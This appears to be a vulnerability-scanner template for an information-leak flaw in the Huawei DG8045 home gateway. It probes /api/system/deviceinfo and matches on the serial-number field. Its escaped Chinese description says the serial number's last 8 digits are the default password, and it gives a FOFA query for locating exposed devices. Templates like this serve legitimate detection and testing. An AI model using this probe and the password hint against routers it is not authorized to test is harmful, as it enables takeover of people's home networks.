expression: r0()
id: huawei-dg8045-home-gateway-password-leakage
info:
  author: zan8in
  description: "Huawei DG8045 deviceinfo api\u63A5\u53E3\u5B58\u5728\u4FE1\u606F\u6CC4\
    \u6F0F\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6CC4\u6F0F\u7684\u4FE1\
    \u606F\u53EF\u4EE5\u83B7\u5F97\u8D26\u53F7\u5BC6\u7801\u767B\u5F55\u540E\u53F0\
    \u3002\n------------ SerialNumber \u540E8\u4F4D\u5373\u4E3A\u521D\u59CB\u5BC6\u7801\
    ------------\nfofa: app=\"DG8045-Home-Gateway-DG8045\"\n"
  name: "Huawei DG8045 deviceinfo \u4FE1\u606F\u6CC4\u6F0F\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E5%8D%8E%E4%B8%BA/Huawei%20DG8045%20deviceinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"DeviceName":')
      && response.body.bcontains(b'"SerialNumber":')
    request:
      method: GET
      path: /api/system/deviceinfo
